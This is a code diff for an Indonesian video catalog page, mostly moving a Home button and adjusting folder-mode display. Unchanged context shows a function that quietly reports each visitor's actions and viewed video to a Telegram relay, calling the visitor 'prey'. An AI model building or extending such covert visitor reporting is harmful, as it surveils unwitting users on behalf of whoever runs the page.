@@ -566,17 +566,17 @@
     <div id="katalogSection">
         <div class="katalog-header">
             <div class="katalog-header-title">
-                <button id="btnHomeFolder" class="btn-home-folder" onclick="goHome()">
-                    <i class="fa-solid fa-house"></i> Home
-                </button>
                 <i class="fa-solid fa-film" id="katalogIcon" style="color: #aaa;"></i> 
                 <span id="katalogTitleText">Katalog Video</span>
             </div>
-            <div class="header-controls">
+            <div class="header-controls" id="headerControls">
                 <button class="btn-icon-head" id="btnToggleSearch" title="Cari Video">
                     <i class="fa-solid fa-magnifying-glass"></i>
                 </button>
                 <button class="btn-select-mode" id="btnSelectMode" onclick="toggleSelectMode()">Pilih</button>
+                <button id="btnHomeFolder" class="btn-home-folder" onclick="goHome()">
+                    <i class="fa-solid fa-house"></i> Home
+                </button>
             </div>
             
             <div class="search-box-container" id="searchBoxContainer">
@@ -660,6 +660,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const searchBoxContainer = document.getElementById("searchBoxContainer");
     const btnHomeFolder = document.getElementById("btnHomeFolder");
     const katalogIcon = document.getElementById("katalogIcon");
+    const btnSelectMode = document.getElementById("btnSelectMode");
 
     let currentStage = 'Manual Pause'; 
     let stage2Done = false;
@@ -683,10 +684,11 @@ document.addEventListener("DOMContentLoaded", function () {
         searchBoxContainer.style.display = "none";
         filterKatalog("");
     });
-    
+
     function sendTelegramLog(eventTitle, detailInfo = '') {
         if (!WORKER_URL || WORKER_URL.includes('namakamu')) return;
         const timeNow = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        
         const message = `🫡 <b>Lapor Bossku Aa Regge</b>\n\n🔥 <b>Ada Mangsa Kena Sambaran Hih</b>\n📌 <b>Aksi:</b> ${eventTitle}\n🎬 <b>Target Video:</b> <code>${currentPlayingSlug || rawSlugParam || 'Direct Landing'}</code>\n⏰ <b>Waktu:</b> ${timeNow}\n${detailInfo ? `📝 <b>Detail:</b> ${detailInfo}\n` : ''}`;
 
         fetch(WORKER_URL, {
@@ -731,9 +733,14 @@ document.addEventListener("DOMContentLoaded", function () {
                     return;
                 }
                 
-                btnHomeFolder.style.display = "inline-flex";
-                katalogIcon.style.display = "none";
+                // PENGATURAN TAMPILAN MODE FOLDER
+                katalogIcon.className = "fa-solid fa-folder-closed";
+                katalogIcon.style.color = "#8b5cf6";
                 document.getElementById("katalogTitleText").innerText = `Folder Video (${activeFolderSlugs.length})`;
+                
+                btnToggleSearch.style.display = "none";
+                btnSelectMode.style.display = "none";
+                btnHomeFolder.style.display = "inline-flex";
                 
                 initKatalogData(data, pageFromUrl, activeFolderSlugs);
             }
